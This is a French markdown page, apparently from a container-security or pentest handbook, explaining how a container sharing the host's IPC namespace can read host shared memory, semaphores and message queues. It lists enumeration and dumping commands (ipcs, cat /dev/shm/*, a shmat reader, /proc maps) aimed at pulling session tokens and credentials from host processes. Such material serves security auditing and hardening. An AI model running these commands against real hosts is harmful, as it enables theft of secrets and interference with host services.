---
title: "Espace de noms IPC de l'hôte : lire la mémoire partagée et les files de messages des processus de l'hôte"
order: 3
description: "Un conteneur qui partage l'espace de noms IPC de l'hôte accède aux objets de communication inter-processus System V et POSIX de l'hôte : segments de mémoire partagée, sémaphores et files de messages. Les démons et bases de données de l'hôte qui conservent des données sensibles ou un état de coordination en mémoire partagée deviennent lisibles et modifiables, exposant des secrets et permettant d'interférer avec les services de l'hôte."
keywords:
  - hostipc
  - espace de noms ipc
  - mémoire partagée
  - system v ipc
  - évasion de conteneur
---

# Espace de noms IPC de l'hôte

`--ipc=host` ou `hostIPC: true` rattache le conteneur à l'espace de noms de communication inter-processus de l'hôte, donnant accès aux segments de mémoire partagée System V, aux sémaphores et aux files de messages de l'hôte, ainsi qu'à la mémoire partagée POSIX sous `/dev/shm`. Les processus qui supposent que leurs objets IPC sont privés, tels que des bases de données mettant en cache des lignes en mémoire partagée ou des démons se coordonnant via des sémaphores, sont désormais exposés au conteneur.

Confirmez et énumérez les objets :

```bash
ipcs                                       # all SysV segments, semaphores, queues
ipcs -m                                     # shared memory segments with owners and sizes
ls -la /dev/shm                             # POSIX shared memory files
```

## Voies

```bash
# Attach to a host shared-memory segment and dump it for secrets
# shmid and size come from ipcs -m; a small reader attaches and reads it:
#   id = shmget(key, size, 0); p = shmat(id, 0, SHM_RDONLY); write(1, p, size);
cat /dev/shm/*                              # POSIX segments often readable directly

# Read a host process's mapped shared memory via its maps + mem
grep -F '/dev/shm' /proc/<pid>/maps
```

Une base de données ou une application qui conserve des jetons de session, des données déchiffrées ou des identifiants dans un segment partagé les divulgue directement dans le conteneur via `ipcs` et un court lecteur `shmat` ; les fichiers `/dev/shm` sont fréquemment lisibles par tous ou par leur propriétaire et ne nécessitent aucun code.

## Notes d'exploitation

- Il s'agit principalement d'une primitive de divulgation d'informations et d'interférence : elle lit des secrets depuis la mémoire partagée de l'hôte et peut corrompre l'état de coordination, mais elle n'exécute pas directement de code sur l'hôte.
- Sa valeur dépend de ce que les processus de l'hôte stockent dans l'IPC ; les bases de données, les caches et certains démons sont les cibles les plus riches. Énumérez les propriétaires avec `ipcs -m` et associez-les aux processus de l'hôte.
- Associez à un espace de noms PID partagé pour relier les segments au processus hôte propriétaire et localiser celui qui est intéressant ; voir [Espace de noms PID de l'hôte](host-pid-namespace.md).

## Références

- [man 7 svipc](https://man7.org/linux/man-pages/man7/sysvipc.7.html)
- [man 7 ipc_namespaces](https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html)
- [HackTricks : IPC namespace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces/ipc-namespace)
